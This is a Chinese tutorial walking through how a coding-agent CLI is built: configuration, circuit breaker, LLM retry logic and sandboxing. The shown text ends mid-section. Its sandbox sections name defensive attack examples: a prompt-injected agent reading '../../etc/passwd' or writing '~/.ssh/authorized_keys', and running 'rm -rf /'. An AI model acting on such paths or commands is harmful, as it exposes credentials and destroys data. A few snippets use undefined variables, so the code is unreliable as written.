# RepoPilot 手把手开发细节文档

> 本文档按开发顺序，逐模块讲解每一步**具体怎么做的、用了什么技术、参数为什么这么设、怎么测试的、数据怎么流转的**。
> 目标：你自己从头写也能复现，面试追问任何细节都能答上来。

---

## Step 0：环境准备（项目脚手架）

### 0.1 创建项目结构

```bash
mkdir RepoPilot && cd RepoPilot
mkdir repopilot
mkdir repopilot/llm
mkdir repopilot/sandbox
mkdir tests
mkdir docs
```

### 0.2 pyproject.toml 详解

**技术选型：**
- 用 `pyproject.toml` 而不是 `setup.py`：PEP 621 标准，现代 Python 项目标配
- 构建后端用 `setuptools.build_meta`：最稳定的选择
- 入口点用 `[project.scripts]`：安装后自动生成 `repopilot` 命令

```toml
[build-system]
requires = ["setuptools>=68", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "repopilot"
version = "0.1.0"
requires-python = ">=3.10"        # 3.10支持 X|Y 联合类型、match 语句
dependencies = [
    "typer>=0.12",              # CLI框架，基于类型注解自动生成
    "rich>=13",                 # 终端美化（表格、Markdown、Live渲染）
    "litellm>=1.40",            # 统一调用100+LLM，接口兼容OpenAI
    "openai>=1.30",             # LiteLLM依赖openai SDK的异常类型
    "docker>=7.0",              # Docker Engine SDK for Python
    "tree-sitter>=0.21",        # 代码解析（Repo Map用，后续T11实现）
    "pathspec>=0.12",           # .gitignore解析
    "structlog>=24.0",          # 结构化日志
    "pyyaml>=6.0",              # （保留）YAML支持
    "jinja2>=3.1",              # （保留）提示词模板
    "httpx>=0.27",              # （保留）HTTP客户端
    "diskcache>=5.6",           # （保留）磁盘缓存
    "tomli>=2.0;python_version<'3.11'",  # 3.10下的tomllib后备
]

[project.optional-dependencies]
dev = ["pytest>=8.0", "pytest-timeout", "pytest-cov", "ruff>=0.5"]

[project.scripts]
repopilot = "repopilot.cli:app"  # pip install -e . 后 repopilot 命令生效
```

**为什么选 LiteLLM 而不是直接 openai SDK：**
- LiteLLM 把所有提供商（OpenAI/Anthropic/火山/DeepSeek/通义/GLM）的API统一成OpenAI格式
- 调用方式完全一样：`litellm.completion(model="openai/gpt-4o", messages=[...])`
- 切换模型只改model字符串，不用换SDK
- `litellm.drop_params = True`：如果某模型不支持temperature等参数，自动忽略不报错

### 0.3 安装开发环境

```bash
pip install -e ".[dev]"
```
`-e` 是editable模式，改代码不用重新pip install，命令自动生效。

### 0.4 初始化版本文件

```python
# repopilot/__init__.py
__version__ = "0.1.0"
```

**测试方法：**
```bash
repopilot version  # 应该输出版本号
python -c "import repopilot; print(repopilot.__version__)"
```

---

## Step 1：配置系统（config.py）—— 最详细的讲解

### 1.1 为什么配置系统要先做？

配置系统是整个项目的地基——LLM服务需要model/api_key/base_url，Sandbox需要docker_image/mem_limit，Agent需要max_steps/budget_tokens。所有模块都依赖配置。

### 1.2 技术选型：为什么用 dataclass + TOML？

**dataclass 优点：**
- 自动生成 `__init__`、`__repr__`、`__eq__`，不用手写样板代码
- 类型注解清晰，IDE有补全
- 每个字段可以设置默认值，字段级验证可以写在 `__post_init__`

**TOML 优点：**
- Python官方标准（pyproject.toml就是TOML），3.11内置tomllib，3.10用tomli后备
- 支持注释、支持多行字符串、类型自动推导
- 比JSON好写，比YAML简单不会缩进出错

### 1.3 Settings 数据类 —— 每个字段为什么这么设计？

```python
@dataclass
class Settings:
    # ── LLM 配置 ──
    model: str = ""                # 空字符串表示"未配置"，触发首次运行向导
    fast_model: str = ""           # 三层路由：fast便宜/default主力/strong高质量
    strong_model: str = ""
    api_key: str = ""              # 空则从环境变量找
    base_url: str = ""             # 火山/本地部署需要自定义base_url
```

**为什么model/fast/strong三个分开，而不是只有一个model？**

因为Code Agent不同任务对模型质量需求不同：
- 做规划、反思、压缩历史时，不需要最强模型，用fast模型省90%成本
- 实际写代码时，用default模型（大上下文窗口，5M tokens）
- 最终整合答案时，用strong模型保证质量

```python
    # ── Sandbox 配置 ──
    sandbox_type: str = "docker"        # 默认docker（安全）
    docker_image: str = "repopilot-sandbox:py310"
    docker_cpu_quota: int = 200000      # cgroup cpu.cfs_quota_us，配合period=100000
    docker_mem_limit: str = "2g"        # cgroup内存硬限制
    docker_network: str = "bridge"      # bridge=可联网, none=断网隔离
    local_cwd: str = ""                 # local模式的工作目录
```

**cgroup参数解释（面试会问）：**
- `cpu_period=100000`（100ms）是Linux CFS的调度周期，固定值
- `cpu_quota=200000` 表示在每个100ms周期内，容器最多用200ms的CPU时间，即2核
- 公式：`核数 = cpu_quota / cpu_period`，这里是 200000/100000 = 2
- `mem_limit="2g"`：超过2G内存会触发OOM Kill，防止Agent写死循环吃内存

```python
    # ── 权限配置 ──
    approval_mode: str = "confirm"     # auto=全放行, confirm=确认危险操作, edit-only=只读自动, deny=全拒绝
```

四种权限模式的设计参考Codex CLI：
- `auto`：完全信任模式，所有操作自动执行，适合脚本/CI场景
- `confirm`：默认模式，写文件/执行命令前弹出"允许/拒绝/编辑"提示
- `edit-only`：读操作自动放行（ls/cat/grep），写操作需要确认
- `deny`：只读模式，禁止任何修改，适合代码审查

```python
    # ── Agent 循环配置 ──
    max_steps: int = 50                # 防止无限循环
    budget_tokens: int = 200_000       # 单次任务总token预算
    tool_timeout: int = 30             # 每个工具调用超时秒数
    reflect_every: int = 5             # 每N步触发一次反思（后续实现）
    max_consecutive_failures: int = 5  # 连续失败次数上限
```

**为什么max_steps=50？**
- 真实编程任务（读文件→搜索→修改→跑测试→修复）通常10-30步完成
- 50步留有余量，超出说明Agent陷入循环，需要停止
- 防止API费用爆炸

**为什么budget_tokens=200_000？**
- 对应200K tokens，约15万汉字，足够长任务
- 用支持5M上下文的doubao-seed-evolving时可以调大，但一般200K足够

```python
    # ── 路径配置 ──
    home_dir: Path = field(default_factory=lambda: _expand(
        os.environ.get("REPOPILOT_HOME", "~/.repopilot")))
```

**为什么用 `field(default_factory=...)` 而不是直接写默认值？**

这是Python dataclass的一个经典坑：
```python
# ❌ 错误：所有Settings实例共享同一个list/dict/Path对象！
home_dir: Path = Path("~/.repopilot")

# ✅ 正确：每个实例创建时调用factory，生成独立对象
home_dir: Path = field(default_factory=lambda: Path("~/.repopilot"))
```

dataclass的默认值在类定义时求值（只执行一次），可变类型必须用default_factory。

```python
    # ── 压缩配置（后续compaction用） ──
    compact_micro_ratio: float = 0.7    # 上下文用到70%触发轻量压缩
    compact_auto_ratio: float = 0.85    # 用到85%强制压缩
    recent_keep_steps: int = 10         # 压缩时保留最近10轮不压缩
```

**压缩阈值怎么来的？**
- 大多数模型的max_tokens是输入+输出共享的，输入占满了输出就没空间
- 70%时做微压缩（只总结最早的几轮，保留全部细节），成本低
- 85%时做激进压缩（大量总结历史），保证后续有空间生成回答

### 1.4 路径属性设计

```python
@property
def sessions_dir(self) -> Path: return self.home_dir / "sessions"
@property
def state_db_path(self) -> Path: return self.home_dir / "state.sqlite"
# ... 其他路径
```

用`@property`而不是在__init__里创建，因为home_dir可能在__post_init__后被覆盖（比如从配置文件加载）。property每次访问时动态计算，永远和home_dir一致。

### 1.5 四层配置加载优先级（重点面试题）

```
优先级从低到高：
1. 硬编码默认值（Settings类字段默认值）
2. ~/.repopilot/config.toml（用户持久化配置）
3. 环境变量（REPOPILOT_XXX，CI/CD场景常用）
4. 代码显式覆写（Settings.load(xxx=yyy)，如CLI参数）
```

**为什么这个顺序？**
- 默认值保证代码能跑（至少不会None报错）
- 配置文件是用户的"长期偏好"
- 环境变量用于临时覆盖（如CI中指定不同的API Key）
- 代码覆写优先级最高，CLI参数是用户最直接的意图表达

**实现细节（`Settings.load()` 的核心逻辑）：**
```python
@classmethod
def load(cls, **overrides) -> "Settings":
    # 第一步：先解析home_dir！因为config.toml在home_dir里
    home_raw = overrides.get("home_dir") or os.environ.get("REPOPILOT_HOME", "~/.repopilot")
    home = _expand(home_raw)

    # 第二步：创建默认Settings（加载硬编码默认值）
    s = cls()
    s.home_dir = home
    s.ensure_dirs()

    # 第三步：读config.toml（如果存在）
    if s.config_file.exists():
        with open(s.config_file, "rb") as fh:
            data = tomllib.load(fh)
        core = data.get("core", {})
        for f in fields(cls):
            if f.name in core and f.name in cls._PERSISTED_FIELDS:
                setattr(s, f.name, core[f.name])

    # 第四步：环境变量覆盖
    for f_name, (env_key, converter) in cls._ENV_MAP.items():
        raw = os.environ.get(env_key)
        if raw is not None:
            setattr(s, f_name, converter(raw))  # converter处理str→int/bool转换

    # 第五步：显式overrides最高优先级
    for k, v in overrides.items():
        if hasattr(s, k):
            setattr(s, k, v)

    s.__post_init__()  # 最后统一校验
    # 自动派生fast/strong model
    if s.model and not s.fast_model:
        s.fast_model = s.model
    if s.model and not s.strong_model:
        s.strong_model = s.model
    return s
```

**关键细节：为什么必须先解析home_dir？**
因为config.toml在`~/.repopilot/config.toml`，如果home_dir还没确定，就不知道去哪里找配置文件。这是顺序依赖——配置加载的第一步必须是home_dir。

**环境变量类型转换问题：**
环境变量全是字符串，但`max_steps`需要int，`stream`需要bool，所以`_ENV_MAP`为每个变量指定了converter：
```python
"max_steps": ("REPOPILOT_MAX_STEPS", int),
"stream": ("REPOPILOT_STREAM", lambda v: v.lower() in ("1","true","yes")),
```
bool转换要特别处理——不能直接`bool("false")`因为这返回True（非空字符串都是True），必须用lambda显式判断值。

### 1.6 验证逻辑（__post_init__）

```python
def __post_init__(self):
    if self.sandbox_type not in ("docker", "local"):
        raise ValueError(f"sandbox_type must be docker|local, got {self.sandbox_type!r}")
    if self.approval_mode not in ("auto", "confirm", "edit-only", "deny"):
        raise ValueError(f"invalid approval_mode: {self.approval_mode!r}")
    if self.max_steps < 1:
        raise ValueError("max_steps must be >= 1")
    if self.budget_tokens < 1000:
        raise ValueError("budget_tokens must be >= 1000")
    for f in (self.model, self.fast_model, self.strong_model):
        if f and "/" not in f:
            raise ValueError(f"model must be in 'provider/model' format (LiteLLM)")
```

**为什么模型名必须带`provider/`前缀？**
LiteLLM靠前缀决定用哪个API：
- `openai/gpt-4o` → 走OpenAI格式API
- `anthropic/claude-3-sonnet` → 走Anthropic API
- `volcengine/doubao-xxx` → 走火山引擎API
- 没有前缀LiteLLM不知道用哪个协议

### 1.7 TOML持久化（save方法）

**设计原则：只写非默认值。**
```python
def save(self) -> None:
    defaults = Settings()  # 拿到默认值
    lines = [f"# RepoPilot configuration", f"[{self._TOML_SECTION}]", ""]
    for f in fields(self):
        val = getattr(self, f.name)
        if val == getattr(defaults, f.name):
            continue  # 等于默认值就不写，保持文件简洁
        # 根据类型输出TOML格式
        if isinstance(val, bool):
            lines.append(f"{f.name} = {'true' if val else 'false'}")
        elif isinstance(val, str) and val:
            escaped = val.replace("\\", "\\\\").replace('"', '\\"')
            lines.append(f'{f.name} = "{escaped}"')
```

**为什么不写默认值？**
- 保持config.toml简洁，用户一眼就能看到自己改了什么
- 未来版本升级改默认值时，用户的配置文件不会因为旧默认值而被锁定在旧行为

### 1.8 怎么测试配置系统？

用pytest的fixture和monkeypatch：

```python
def test_env_override(monkeypatch, tmp_path):
    reset_settings_for_tests()
    monkeypatch.setenv("REPOPILOT_MODEL", "openai/gpt-4o-mini")
    monkeypatch.setenv("REPOPILOT_MAX_STEPS", "10")
    s = Settings.load()
    assert s.model == "openai/gpt-4o-mini"
    assert s.max_steps == 10  # 验证字符串自动转int
    reset_settings_for_tests()

def test_save_and_load_persists(tmp_path):
    # 写入配置
    s = Settings(home_dir=str(tmp_path / "rp"), model="openai/test", api_key="sk-abc")
    s.save()
    # 重新加载，验证持久化
    reset_settings_for_tests()
    s2 = Settings.load(home_dir=str(tmp_path / "rp"))
    assert s2.model == "openai/test"
    assert s2.api_key == "sk-abc"

def test_path_traversal_in_config():
    """验证home_dir被正确展开"""
    s = Settings(home_dir="~/.repopilot_test")
    assert "~" not in str(s.home_dir)
```

**测试要点：**
- 用`tmp_path`（pytest内置fixture）提供临时目录，测试结束自动清理
- 用`monkeypatch.setenv`设置环境变量，不影响真实环境
- 用`reset_settings_for_tests()`清掉全局缓存，避免测试间状态污染
- 测试边界条件：无效值是否raise ValueError、bool/int转换是否正确、默认值是否不写入文件、env是否覆盖文件配置

---

## Step 2：熔断器（circuit_breaker.py）

### 2.1 为什么需要熔断器？

想象这个场景：API Key过期了，每次LLM调用等25秒超时才报错。Agent循环50步，每步都超时重试2次=等待25×3×50=62.5分钟，全部失败。用户以为卡死了。

熔断器的作用：连续失败N次后，直接拒绝请求（快速失败），等一段时间放一个探测请求看看服务恢复没。

### 2.2 熔断器状态机

```
         失败率≥阈值
    Closed ─────────→ Open
      ↑                │
      │探测成功        │等待cooldown时间
      │                ↓
    Half-Open ←───────┘
         探测失败→重新Open
```

### 2.3 滑动窗口实现细节

```python
@dataclass
class CircuitBreaker:
    window: int = 20           # 窗口大小：只看最近20次调用
    min_calls: int = 5         # 最少5次调用才开始判断（样本不足不熔断）
    error_rate: float = 0.5    # 50%失败率触发熔断
    cooldown: float = 60.0     # 熔断60秒后进入半开
```

**为什么用deque实现滑动窗口？**
```python
self._calls: deque[int] = deque(maxlen=window)
```
`deque(maxlen=20)`自动维护一个定长队列：新元素加入时，如果超过20个自动把最老的弹出去。完美实现滑动窗口——永远只保留最近20次调用的结果（1=成功，0=失败）。

相比计数器方案（时间窗口），滑动窗口不会出现"窗口边界"问题（比如前一个窗口最后1秒大量失败，下一个窗口第一秒清零，误以为服务恢复）。

### 2.4 状态转换逻辑

```python
def record_failure(self):
    with self._lock:
        self._calls.append(0)  # 0表示失败
        if self._state == "half-open":
            # 半开状态下探测失败→立刻熔断
            self._state = "open"
            self._opened_at = time.time()
            return
        if len(self._calls) >= self.min_calls:
            failures = sum(1 for c in self._calls if c == 0)
            if failures / len(self._calls) >= self.error_rate:
                self._state = "open"
                self._opened_at = time.time()
```

**关键细节：**
- 半开状态下任何失败都立刻回到Open（不看错误率），因为探测请求就是来试的，失败说明服务还没恢复
- 只有在窗口内调用次数达到min_calls时才判断，避免样本量太小时误判（比如第1次调用就失败就熔断？不行）
- 用`threading.Lock()`保护所有状态修改，因为Agent可能有并发（比如后台任务和主循环同时调LLM）

```python
def allow_request(self) -> bool:
    with self._lock:
        if self._state == "closed":
            return True
        if self._state == "open":
            if time.time() - self._opened_at >= self.cooldown:
                self._state = "half-open"  # 冷却到了，进入半开放一个探测
                return True
            return False  # 还在冷却中，拒绝
        return True  # half-open放一个探测请求通过
```

### 2.5 参数怎么选的？

| 参数 | 值 | 理由 |
|------|-----|------|
| window=20 | 最近20次 | 太小会误判，太大会反应慢 |
| min_calls=5 | 至少5次 | 避免偶发错误触发熔断 |
| error_rate=0.5 | 50% | 不是100%才熔断，容忍偶发错误 |
| cooldown=60s | 60秒 | 给服务恢复时间，又不至于让用户等太久 |

### 2.6 怎么测试熔断器？

```python
def test_circuit_half_open_after_cooldown():
    cb = CircuitBreaker(window=10, min_calls=2, error_rate=0.5, cooldown=0.05)
    cb.record_failure()
    cb.record_failure()
    assert cb.allow_request() is False  # 熔断器打开
    time.sleep(0.1)                     # 等待冷却
    assert cb.allow_request() is True   # 进入半开，允许探测
    assert cb.state == "half-open"
    cb.record_success()                 # 探测成功→闭合
    assert cb.state == "closed"
```

**测试要点：**
- 测试用cooldown=0.05秒（不用真等60秒）
- 必须覆盖三种状态和所有转换路径
- 验证线程安全（可以多线程并发调用test，但当前用了lock应该安全）

---

## Step 3：LLM服务（llm/service.py）

### 3.1 三层模型路由和超时

```python
TIER_TIMEOUTS = {Tier.FAST: 15, Tier.DEFAULT: 25, Tier.STRONG: 40}
```

- Fast模型做简单任务（分类、总结），应该秒回，15秒超时够了
- Default模型做复杂代码生成，25秒
- Strong模型做深度推理（代码审查、复杂重构），40秒

### 3.2 重试机制详解

```python
for attempt in range(self.max_retries + 1):  # max_retries=2 表示最多3次调用
    try:
        resp = litellm.completion(**kwargs)
        self.cb.record_success()
        return self._parse_response(resp, kwargs["model"])
    except Exception as e:
        if not _is_retryable(e):
            self.cb.record_failure()
            raise  # 不可重试直接抛
        if attempt == self.max_retries:
            self.cb.record_failure()
            raise  # 重试用完了还是失败
        # 指数退避 + 全抖动
        delay = min(self.backoff_cap, self.backoff_base * (2 ** attempt))
        delay = delay * (0.5 + random.random() * 0.5)
        time.sleep(delay)
```

**指数退避计算（backoff_base=0.5, cap=8）：**
- 第1次重试：0.5 × 2^0 = 0.5s → 抖动后 0.25s~0.5s
- 第2次重试：0.5 × 2^1 = 1.0s → 抖动后 0.5s~1.0s
- 如果更多重试：2s → 4s → cap到8s封顶

**为什么加全抖动（full jitter）？**
如果不抖动，多个请求同时失败会在同一时刻重试，造成"重试风暴"——服务刚恢复就被一波重试打挂。抖动把重试时间打散，避免尖峰。这是AWS Architecture Blog推荐的最佳实践。

**重试和熔断器的配合：**
- 单次调用内：重试处理偶发错误（网络抖动、临时限流）
- 熔断器层面：多次调用持续失败后，快速拒绝新请求
- 每次top-level chat()调用（包括所有重试）最终失败才record_failure一次
- 每次成功（包括重试后成功）record_success一次

### 3.3 错误分类逻辑

```python
def _is_retryable(exc: Exception) -> bool:
    # 超时/连接错误/限流 → 重试
    if isinstance(exc, (openai.APITimeoutError, openai.APIConnectionError, openai.RateLimitError)):
        return True
    # 400 Bad Request（包括context length exceeded）→ 不重试
    if isinstance(exc, openai.BadRequestError):
        return False
    # 认证/权限/不存在 → 不重试（重试也没用，Key错了重试100次也错）
    if isinstance(exc, (openai.AuthenticationError, openai.PermissionDeniedError, openai.NotFoundError)):
        return False
    # 5xx服务端错误 → 重试
    if isinstance(exc, openai.APIStatusError):
        return exc.status_code == 429 or exc.status_code >= 500
```

**关键判断：context length exceeded为什么不重试？**
BadRequestError中最常见的是上下文超长（400 + "context_length_exceeded"），重试同样的请求同样会超长，没有意义。正确做法是压缩上下文后重试，这个在Agent层处理。

### 3.4 tool_calls解析

```python
def _parse_response(self, resp, model: str) -> LLMResponse:
    choice = resp.choices[0].message
    tool_calls = []
    if getattr(choice, "tool_calls", None):
        for tc in choice.tool_calls:
            args = json.loads(fn.arguments or "{}")  # arguments是JSON字符串，需要parse
            tool_calls.append({
                "id": getattr(tc, "id", ""),
                "name": fn.name,
                "arguments": args,
            })
```

**注意点：**
- OpenAI/LiteLLM返回的tool_calls中，`fn.arguments`是**JSON字符串**而不是dict，必须json.loads
- 要处理arguments为空或非法JSON的情况（当前fallback到{"_raw": fn.arguments}）
- tool_call的id必须保存，因为后续tool_result消息需要引用这个id（OpenAI API要求）

### 3.5 怎么测试LLM服务？

用`unittest.mock.patch`mock掉`litellm.completion`，不真实调用API：

```python
@patch("repopilot.llm.service.litellm.completion")
def test_retry_on_retryable_error(mock_c):
    mock_c.side_effect = [
        openai.RateLimitError("rate limited", response=MagicMock(status_code=429), body=None),
        _make_completion("recovered"),  # 第二次成功
    ]
    svc = _make_llm()
    r = svc.chat([{"role": "user", "content": "hi"}])
    assert r.content == "recovered"
    assert mock_c.call_count == 2  # 重试了1次

@patch("repopilot.llm.service.litellm.completion")
def test_circuit_breaker_opens_after_failures(mock_c):
    mock_c.side_effect = openai.APIConnectionError(request=None)
    svc = _make_llm()
    for _ in range(5):
        try: svc.chat([{"role": "user", "content": "hi"}])
        except: pass
    assert svc.cb.state == "open"  # 熔断器打开
    with pytest.raises(CircuitOpenError):
        svc.chat([{"role": "user", "content": "hi"}])  # 快速失败
```

**测试技巧：**
- `_make_completion()` 工厂函数构造假response（MagicMock模拟openai response对象）
- `side_effect` 可以传列表，每次调用返回列表中的下一个值/异常
- `backoff_base=0.001` 测试中把退避基数设极小，不用真等
- 不用mock覆盖所有代码，只mock外部依赖（litellm.completion），业务逻辑走真实代码

---

## Step 4：Sandbox抽象层（sandbox/base.py）

### 4.1 为什么要抽象Sandbox？

Agent操作代码需要读写文件、执行命令，但：
- 开发调试时不想每次启动Docker容器（慢），直接在本地操作快
- 生产环境必须隔离（Docker容器），防止Agent执行`rm -rf /`
- 未来可能加Firecracker微VM、云端沙盒等

抽象基类定义统一接口，上层Agent代码不关心底层是Local还是Docker。

### 4.2 数据结构设计

**ExecResult的truncated()方法：**

LLM上下文窗口有限，命令输出可能有几MB（如pip install日志），全塞进去就爆了。所以长输出自动截断：
```python
def truncated(self, head=500, tail=1500) -> str:
    if len(out) <= head + tail + 50:
        return f"$ {self.command}\n{out}\n[exit_code={self.exit_code}]"
    keep_head = out[:head]      # 前500字符
    keep_tail = out[-tail:]     # 后1500字符
    skipped = len(out) - head - tail
    return f"$ {self.command}\n{keep_head}\n...[truncated {skipped} chars]...\n{keep_tail}\n[exit_code={self.exit_code}]"
```

**为什么head=500, tail=1500？**
- 大多数错误信息在尾部（Python traceback、编译错误最后几行最有用）
- 头部通常是命令本身和初始输出，看一眼什么命令就行
- 尾部给更多空间，因为关键信息在末尾

**FileReadResult带行号：**

LLM编辑代码时需要知道"第几行"，edit_file工具用字符串匹配，但LLM看代码时行号是重要参考。
```python
@staticmethod
def _add_line_numbers(text: str, start_line: int = 1) -> str:
    lines = text.splitlines()
    width = max(3, len(str(len(lines) + start_line)))  # 动态宽度对齐
    return "\n".join(f"{i:{width}}|{line}" for i, line in enumerate(lines, start_line))
```
输出格式：
```
  1|def add(a, b):
  2|    return a + b
  3|
  4|def subtract(a, b):
  5|    return a - b
```

### 4.3 路径穿越防护（安全核心）

```python
def _safe_path(self, user_path: str) -> Path:
    p = (self.repo_path / user_path).resolve()  # resolve()处理..和符号链接
    try:
        p.relative_to(self.repo_path)  # 如果p不在repo_path下，抛ValueError
    except ValueError:
        raise PermissionError(f"Path escapes repo: {user_path} -> {p}")
    return p
```

**攻击场景：** Agent被prompt注入，尝试读取`../../etc/passwd`或写入`~/.ssh/authorized_keys`。
**防御：** `resolve()`把相对路径解析为绝对路径，`relative_to()`验证绝对路径是否在repo内。如果不在就抛PermissionError。

**为什么这个防御不够（Docker沙盒的补充）？**
LocalSandbox的`_safe_path`是应用层检查，如果Agent找到绕过方法（比如符号链接），就可能逃逸。Docker沙盒在操作系统层面隔离——容器里根本看不到宿主机的其他文件，就算绕过了应用层检查也没用。

### 4.4 忽略目录列表

```python
DEFAULT_IGNORE_DIRS = {
    ".git", "__pycache__", "node_modules", ".venv", "venv",
    "dist", "build", ".mypy_cache", ".pytest_cache", ".ruff_cache",
    ".tox", ".idea", ".vscode", "*.egg-info", ".eggs",
}
```

这些目录里的文件Agent不需要看（依赖包、编译缓存、IDE配置），搜了浪费token还容易干扰。grep/glob/list_dir都自动跳过。

---

## Step 5：LocalSandbox（local_sandbox.py）

### 5.1 read_file分页实现

```python
def read_file(self, path: str, offset: int = 0, limit: int = 200) -> FileReadResult:
    with open(p, "r", encoding="utf-8", errors="replace") as f:
        all_lines = f.readlines()
    total = len(all_lines)
    start = max(0, offset)
    end = min(total, start + limit)
    selected = all_lines[start:end]
    numbered = self._add_line_numbers("".join(selected), start_line=start + 1)
    return FileReadResult(
        path=str(p.relative_to(self.repo_path)),
        content=numbered,
        start_line=start + 1,
        total_lines=total,
        truncated=end < total,  # 告诉LLM文件还有更多
    )
```

**为什么默认limit=200行？**
- 200行代码大约2000-4000 tokens，一次不会占用太多上下文
- LLM需要更多可以指定offset继续读（offset=200, limit=200读下一页）
- `truncated=True`告诉LLM"文件还没读完，需要更多继续offset"

**编码处理：** `errors="replace"`把无法解码的字节替换为``，不会因为二进制文件崩溃。

### 5.2 edit_file精确替换+diff生成

```python
def edit_file(self, path: str, old_string: str, new_string: str) -> str:
    original = p.read_text(encoding="utf-8", errors="replace")
    if old_string not in original:
        close = difflib.get_close_matches(old_string, original.splitlines(), n=1, cutoff=0.6)
        hint = f"\nClosest match:\n{close[0]!r}" if close else ""
        raise ValueError(f"old_string not found in {path}.{hint}")
    new_content = original.replace(old_string, new_string, 1)  # 只替换第一个匹配
    p.write_text(new_content, encoding="utf-8")
    diff = difflib.unified_diff(...)  # 返回unified diff给LLM看
    return "".join(diff)
```

**为什么edit_file比write_file好？**
- write_file覆盖整个文件，容易丢失未注意的内容
- edit_file精确替换，patch小，风险低
- 返回unified diff让LLM确认修改正确（如果diff不对可以重试）
- 这也是Codex/Claude Code的做法——优先用edit/replace而非write

**difflib智能提示：**
如果old_string没找到（可能LLM看到的版本和磁盘不一致），用`get_close_matches`找最相似的行，给LLM有用的错误提示，而不是简单说"not found"。

### 5.3 exec命令执行

```python
result = subprocess.run(
    command,
    shell=True,           # Windows必须shell=True才能用内置命令
    cwd=workdir,
    capture_output=True,
    text=True,
    timeout=timeout,      # 超时会抛TimeoutExpired
    encoding="utf-8",
    errors="replace",
)
```

**Windows上的注意点：**
- `shell=True`在Windows上用`cmd.exe /c`执行，支持dir/echo等内置命令
- 不用shell=True的话，只能执行.exe文件，非常受限
- Linux/Mac上shell=True用`/bin/sh -c`

**超时处理：**
```python
except subprocess.TimeoutExpired as e:
    timed_out = True
    stdout = (e.stdout or b"").decode("utf-8", errors="replace")
    exit_code = -1
```
超时后仍然返回已经捕获的输出（进程被kill前打印了什么），方便LLM判断为什么卡住了。

### 5.4 grep搜索实现

```python
def grep(self, pattern: str, glob_filter=None, ignore_case=False):
    regex = re.compile(pattern, flags)
    for root, dirs, files in os.walk(self.repo_path):
        dirs[:] = [d for d in dirs if d not in DEFAULT_IGNORE_DIRS]  # 原地剪枝
        for fname in files:
            if glob_filter and not fnmatch.fnmatch(fname, glob_filter):
                continue
            with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                for i, line in enumerate(f, 1):
                    if regex.search(line):
                        results.append(GrepMatch(file=rel, line_no=i, content=line.rstrip("\n")[:500]))
```

**os.walk剪枝技巧：**
`dirs[:] = [d for d in dirs if ...]` 用切片赋值（`dirs[:]`）原地修改dirs列表，os.walk会尊重修改后的列表，不进入被过滤的目录。这是官方文档推荐的做法，比事后过滤高效得多——不遍历.git和node_modules可以省大量时间。

**为什么不用ripgrep/rg命令？**
- LocalSandbox需要跨平台（Windows不一定装了rg）
- Python的re+os.walk纯Python实现，零依赖
- 对code agent来说grep性能足够（代码库通常几千文件）
- DockerSandbox中用容器内的grep命令（更快）

---

## Step 6：DockerSandbox（docker_sandbox.py）——最复杂的模块

### 6.1 Docker SDK核心概念

```python
import docker
client = docker.from_env()  # 连接本地Docker Engine（通过/var/run/docker.sock或npipe:////./pipe/docker_engine）
```

`from_env()`自动检测Docker位置：
- Linux/Mac: `unix:///var/run/docker.sock`
- Windows: `npipe:////./pipe/docker_engine`

### 6.2 容器启动流程

```python
def setup(self):
    # 1. 检查镜像是否存在
    try:
        client.images.get(self.image)
    except:
        client.images.pull(self.image)  # 不存在就pull

    # 2. 启动容器
    self._container = client.containers.run(
        self.image,
        command=["sleep", "infinity"],   # 保活命令
        detach=True,                      # 后台运行
        working_dir="/workspace",
        mem_limit=self.mem_limit,         # "2g"
        cpu_period=100000,
        cpu_quota=self.cpu_quota,         # 200000 = 2核
        network_mode=self.network_mode,   # "bridge"或"none"
        mounts=[
            docker.types.Mount(
                "/workspace",
                str(self.repo_path.resolve()),
                type="bind",             # bind mount而非volume
                read_only=False,
            ),
        ],
    )
```

**为什么用`sleep infinity`而不是直接启动一个长运行服务？**
- `python:3.10-slim`镜像默认CMD是`python3`，会立刻退出
- `sleep infinity`让容器一直存活，然后通过`docker exec`在里面执行命令
- 类似"先开机，再登录进去操作"的模式
- 这是Docker SDK执行多个命令的标准模式

**bind mount vs volume：**
- bind mount：直接映射宿主机目录，修改实时双向同步。适合代码目录——Agent在容器内改文件，宿主机立刻看到。
- volume：Docker管理的存储，需要docker cp才能拷贝文件。适合数据库等持久化数据，不适合代码。

### 6.3 Docker exec流式执行（难点）

Docker SDK的exec有个坑：`exec_run()`不支持超时，命令卡死就永远等。所以自己实现流式exec+超时：

```python
def _docker_exec(self, cmd, timeout=30, workdir="/workspace"):
    t0 = time.time()
    exec_id = self._client.api.exec_create(
        self._container.id,
        ["sh", "-c", cmd],       # 用sh -c执行，支持管道/重定向
        workdir=workdir,
        environment={"DEBIAN_FRONTEND": "noninteractive", "PYTHONUNBUFFERED": "1"},
    )
    # exec_start返回generator，流式产出(stdout_bytes, stderr_bytes)元组
    stream = self._client.api.exec_start(exec_id, stream=True, demux=True)
    out_chunks, err_chunks = [], []
    timed_out = False
    for out_b, err_b in stream:
        if time.time() - start > timeout:
            timed_out = True
            break               # 超时直接break，不继续读
        if out_b: out_chunks.append(out_b)
        if err_b: err_chunks.append(err_b)
    stdout = b"".join(out_chunks)
    stderr = b"".join(err_chunks)
    # 获取exit code（必须在exec_start完成后inspect）
    inspect = self._client.api.exec_inspect(exec_id)
    exit_code = inspect.get("ExitCode", -1)
```

**demux=True是什么？**
Docker exec的输出是混在一个stream里的（stdout和stderr有8字节header区分）。demux=True让SDK帮我们拆分，返回(out, err)元组，不用自己解析Docker stream protocol。

**为什么不用`container.exec_run()`？**
- 高层API `container.exec_run()`会一次性返回所有输出，不支持流式读取
- 无法中途超时——只能等命令完成
- 底层API `client.api.exec_create`+`exec_start`更灵活

### 6.4 read_file用sed分页

容器内用sed命令实现分页读：
```python
def read_file(self, path, offset=0, limit=200):
    cp = self._container_path(path)
    if offset == 0:
        cmd = f"sed -n '1,{limit}p' {shquote(cp)}; echo __LINES__; wc -l < {shquote(cp)}"
    else:
        start = offset + 1
        end = offset + limit
        cmd = f"sed -n '{start},{end}p' {shquote(cp)}; echo __LINES__; wc -l < {shquote(cp)}"
```
用`echo __LINES__`分隔内容和总行数，避免发两次exec命令。

**为什么不通过mount直接读文件？**
其实可以（bind mount了），但为了一致性和安全性（路径都经过容器内路径处理），文件操作走容器内命令。实际write_file/edit_file利用了mount直接写宿主文件，更高效。

### 6.5 shell注入防护——shquote函数

```python
def shquote(s: str) -> str:
    """Single-quote a string for sh -c, safely."""
    return "'" + s.replace("'", "'\"'\"'") + "'"
```

**原理：**
